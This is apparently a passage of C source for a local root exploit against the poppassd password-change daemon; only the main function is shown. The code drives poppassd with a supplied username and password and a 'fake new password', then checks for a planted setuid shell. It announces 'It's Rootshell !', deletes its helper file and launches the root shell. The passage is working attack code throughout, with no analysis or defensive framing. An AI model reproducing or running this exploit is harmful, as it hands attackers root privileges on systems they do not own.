int main(int argc, char *argv[])
{
	int whtl;
	char user_id[BUF_SZ]=D_NAME;
	char passwd[BUF_SZ]=D_NAME;
	char tg_path[BUF_SZ]=D_POPPASS;
	char df_sh[BUF_SZ]=D_SHELL;

	(void)banrl();
	
	while((whtl=getopt(argc,argv,"U:u:P:p:T:t:Hh"))!=-1)
	{
		extern char *optarg;
		switch(whtl)
		{
			case 'U':
			case 'u':
				memset((char *)user_id,0,sizeof(user_id));
				strncpy(user_id,optarg,sizeof(user_id)-1);
				break;
				
			case 'P':
			case 'p':
				memset((char *)passwd,0,sizeof(passwd));
				strncpy(passwd,optarg,sizeof(passwd)-1);
				break;
				
			case 'T':
			case 't':
				memset((char *)tg_path,0,sizeof(tg_path));
				strncpy(tg_path,optarg,sizeof(tg_path)-1);
				break;
				
			case 'H':
			case 'h':
				(void)usage(argv[0]);
				break;
				
			case '?':
				fprintf(stderr," Try `%s -i' for more information.\n\n",argv[0]);
				exit(-1);
				break;
		}
	}
	
	if(!strcmp(user_id,D_NAME)||!strcmp(passwd,D_NAME))
	{
		(void)usage(argv[0]);
		exit(-1);
	}
	else
	{
		char comm[1024];
		int out[2],in[2];

		if(((int)m_sh())==-1)
		{
			fprintf(stdout," [-] exploit failed.\n\n");
			exit(-1);
		}

		if(pipe(out)==-1)
		{
			perror(" [-] pipe() error");
			exit(-1);
		}
		
		if(pipe(in)==-1)
		{
			perror(" [-] pipe() error");
			exit(-1);
		}
		
		switch(fork())
		{
			case -1:
				perror(" [-] fork() error");
				break;

			case 0:
				close(out[0]);
				close(in[1]);
				
				dup2(out[1],STDOUT_FILENO);
				dup2(in[0],STDIN_FILENO);
				
				execl(tg_path,tg_path,"-s",D_EXEC,0);
				break;

			default:
				close(out[1]);
				close(in[0]);

				fprintf(stdout," [+] execute poppassd.\n");
				memset((char *)comm,0,sizeof(comm));
				read(out[0],comm,sizeof(comm)-1);
				fprintf(stdout," %s",comm);

				memset((char *)comm,0,sizeof(comm));
				snprintf(comm,sizeof(comm)-1,"user %s\r\n",user_id);
				fprintf(stdout," [+] input username.\n");
				write(in[1],comm,strlen(comm));

				memset((char *)comm,0,sizeof(comm));
				read(out[0],comm,sizeof(comm)-1);
				fprintf(stdout," %s",comm);

				memset((char *)comm,0,sizeof(comm));
				snprintf(comm,sizeof(comm)-1,"pass %s\r\n",passwd);
				fprintf(stdout," [+] input password.\n");
				write(in[1],comm,strlen(comm));

				memset((char *)comm,0,sizeof(comm));
				read(out[0],comm,sizeof(comm)-1);
				fprintf(stdout," %s",comm);

				memset((char *)comm,0,sizeof(comm));
				snprintf(comm,sizeof(comm)-1,"newpass %s\r\n",passwd);
				fprintf(stdout," [+] input fake new password.\n");
				write(in[1],comm,strlen(comm));

				close(out[0]);
				close(in[1]);
				break;
		}

		fprintf(stdout," [+] wait, 2sec.\n");
		sleep(2);

		if((stat(D_SHELL,&ss)==0)&&(ss.st_mode&S_ISUID))
		{
			fprintf(stdout," [+] Ok, exploited successfully.\n");
			fprintf(stdout," [*] It's Rootshell !\n\n");
			unlink(D_EXEC);
			execl(D_SHELL,D_SHELL,0);
		}
		else
		{
			fprintf(stdout," [-] exploit failed.\n\n");
			exit(-1);
		}
	}
}